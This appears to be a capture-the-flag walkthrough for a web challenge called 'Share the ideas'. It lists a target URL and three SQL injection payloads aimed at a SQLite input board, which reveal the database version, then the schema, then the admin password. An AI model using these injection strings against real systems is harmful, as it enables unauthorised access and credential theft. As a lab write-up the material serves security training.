
## Level : Medium

#### Challenge Name : Share the ideas  
- Challenge Desciption
```
can you reveal the admin password ?
```
- Walk Throught
  - URL : http://35.197.204.100/shareideas/
  ```
  1. See in Input Board
  2. Then SQL Injection 
  - test' || ((SELECT sqlite_version()));--)
  - test' || (SELECT sql FROM sqlite_master));--
  - test' || (SELECT password FROM xde43_users WHERE role="admin"));--
  ```